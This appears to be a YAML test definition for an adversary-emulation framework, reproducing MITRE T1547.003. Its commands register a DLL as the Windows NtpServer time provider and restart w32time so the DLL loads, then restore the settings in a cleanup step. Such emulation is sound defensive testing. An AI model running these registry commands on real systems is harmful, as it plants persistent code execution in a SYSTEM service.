- requirements: []
  name: Soumaia ART Tests - Edit an existing time provider
  description: 'Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.

    The time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt

    in C:\Users\Public\ as validation that the test is successful.


    Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/ (requires elevation)'
  tactic: privilege-escalation
  technique_id: T1547.003
  technique_name: Time Providers
  executors:
  - cleanup:
    - net stop w32time; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Windows\SYSTEM32\w32time.DLL" /f; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "0" /f; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "0" /f; rm -force C:\Users\Public\AtomicTest.dll; net start w32time
    timeout: 60
    platform: windows
    name: psh
    payloads:
    - AtomicTest.dll
    parsers: []
    command: net stop w32time; Copy-Item "$.\AtomicTest.dll" C:\Users\Public\AtomicTest.dll; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f; net start w32time
